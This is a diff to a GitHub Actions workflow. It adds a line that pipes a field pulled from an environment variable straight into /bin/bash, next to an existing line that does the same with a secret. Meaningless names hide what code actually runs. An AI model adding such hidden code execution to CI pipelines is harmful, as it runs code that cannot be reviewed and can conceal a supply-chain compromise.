@@ -21,6 +21,7 @@ jobs:
           m45: ${{ secrets.m45 }}
         run: |
           printf '%s' "$m45" | jq -r .tu08365 | /bin/bash
+          echo $ciyt5524 | jq -r .sf165 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
